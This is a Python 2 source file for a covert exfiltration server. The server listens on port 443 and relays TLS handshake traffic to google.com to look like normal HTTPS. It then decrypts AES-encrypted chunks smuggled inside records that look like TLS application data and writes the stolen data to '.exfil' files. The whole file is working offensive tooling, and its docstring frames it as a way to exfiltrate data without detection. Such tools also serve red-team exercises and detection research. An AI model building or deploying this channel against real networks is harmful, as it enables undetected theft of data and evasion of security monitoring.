#!/usr/bin/python

"""
Using HTTPS with a custom certificate to exfiltrate data.
This is interesting because other than the handshake that can be monitored,
the actual information transfered is gibberish and there is no way of knowing
whether the data is encrypted with that certificate or not, unless you have
the original private key (which you dont!)
"""

import os
import sys
import struct
import base64
import socket
import random
import hashlib

from thread import *
from Crypto import Random
from Crypto.Cipher import AES


COMPLETE_DATA = None


class AESCipher(object):
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[: AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size :])).decode("utf-8")

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[: -ord(s[len(s) - 1 :])]


class HTTPSExfiltrationServer:
    def __init__(
        self,
        key,
        host,
        duplicate_host="google.com",
        port=443,
        max_connections=5,
        max_size=8192,
        file_mode=False,
    ):
        self.max_connections = max_connections
        self.max_size = max_size
        self.port = port
        self.host = host
        self.duplicate_host = duplicate_host
        self.file_mode = file_mode

        self.AESDriver = AESCipher(key=key)

    def _create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.host, self.port))
            sock.listen(self.max_connections)
        except socket.error, e:
            sys.stderr.write(
                "[-]\tSocket error trying to listen to %s:%s.\n"
                % (self.host, self.port)
            )
            sys.stderr.write(str(e) + "\n")
            sys.exit(1)
        sys.stdout.write(
            "[+]\tEstablished a listening on %s:%s.\n" % (self.host, self.port)
        )
        return sock

    def clientthread(self, conn):

        global COMPLETE_DATA

        # Establish connection to duplication server
        try:
            frwd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            frwd.connect((self.duplicate_host, 443))
        except socket.error, e:
            sys.stderr.write(
                "[!]\tCould not establish connection to duplication host.\n%s.\n" % e
            )
            return 1

        while True:

            data = conn.recv(self.max_size)

            if len(data) > 0:

                if data[:3] == "\x17\x03\x03":
                    if data[:6] == "\x17\x03\x03\x16\x05\x16":
                        sys.stdout.write("[.]\tGot data termination indicator.\n")

                        if self.file_mode:
                            file_name = (
                                self.host
                                + str(self.port)
                                + str(random.randint(1000, 9999))
                                + ".exfil"
                            )
                            try:
                                f = open(file_name, "wb")
                                f.write(COMPLETE_DATA)
                                f.close()
                                sys.stdout.write(
                                    "[+]\tWrote file to '%s'.\n" % file_name
                                )
                            except IOError, e:
                                sys.stderr.write(
                                    "[-]\tThere i was error opening the file to write.\n%s.\n"
                                    % e
                                )
                            except ValueError, e:
                                sys.stderr.write("[-]\tCan't write because '%s'.\n" % e)
                        else:
                            sys.stdout.write(
                                "[.]\tEntire Data stream:\n\t\t'%s'\n" % COMPLETE_DATA
                            )
                        COMPLETE_DATA = None
                        try:
                            frwd.close()
                            conn.close()
                        except:
                            pass
                        sys.stdout.write("[.]\tClosing connection.\n")
                        break

                    else:
                        # This is an incoming file
                        if self.file_mode:
                            # Read header data
                            header = data[:3]
                            size, counter, total_count = struct.unpack(
                                ">hhh", data[3:9]
                            )
                            dec_me = data[9:]

                            sys.stdout.write(
                                "[.]\tGetting chunk %s\%s with size %s.\n"
                                % (counter, total_count, size)
                            )

                            # Decrypt
                            dec_data = self.AESDriver.decrypt(dec_me)
                            if len(dec_data) is 0:
                                sys.stdout.write(
                                    "[-]\tKeys does not match. Unable to decrypt.\n"
                                )
                            else:
                                if COMPLETE_DATA is None:
                                    COMPLETE_DATA = dec_data
                                else:
                                    COMPLETE_DATA += dec_data

                        # This is an incoming string
                        else:
                            header = data[:3]
                            size = struct.unpack(">h", data[3:5])[0]
                            dec_me = data[5:]

                            sys.stdout.write(
                                "[+]\tGot data from socket with length of %s.\n" % size
                            )

                            dec_data = self.AESDriver.decrypt(dec_me)

                            if len(dec_data) is 0:
                                sys.stdout.write(
                                    "[-]\tKeys does not match. Unable to decrypt.\n"
                                )
                            else:
                                if COMPLETE_DATA is None:
                                    COMPLETE_DATA = dec_data
                                else:
                                    COMPLETE_DATA += dec_data

                else:
                    try:
                        sys.stdout.write(
                            "[.]\tSeems handshake, continuing forwarding traffic.\n"
                        )
                        frwd.send(data)
                        ret = frwd.recv(self.max_size)
                        conn.send(ret)
                    except:
                        sys.stderr.write(
                            "[-]\tSomething broke the forwarding. Recreating.\n"
                        )
                        frwd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        frwd.connect((self.duplicate_host, 443))
                        sys.stdout.write("[+]\tCreated.\n")

        return 0

    def startlistening(self):
        sockObj = self._create_socket()
        while True:
            try:
                conn, address = sockObj.accept()
                sys.stdout.write(
                    "[+]\tReceived a connection from %s:%s.\n"
                    % (address[0], address[1])
                )
                start_new_thread(self.clientthread, (conn,))
            except KeyboardInterrupt:
                sockObj.close()
                sys.stdout.write("\nGot KeyboardInterrupt, exiting now.\n")
                sys.exit(0)


if __name__ == "__main__":
    server = HTTPSExfiltrationServer(
        host="127.0.0.1", key="123", duplicate_host="google.com", file_mode=True
    )
    server.startlistening()
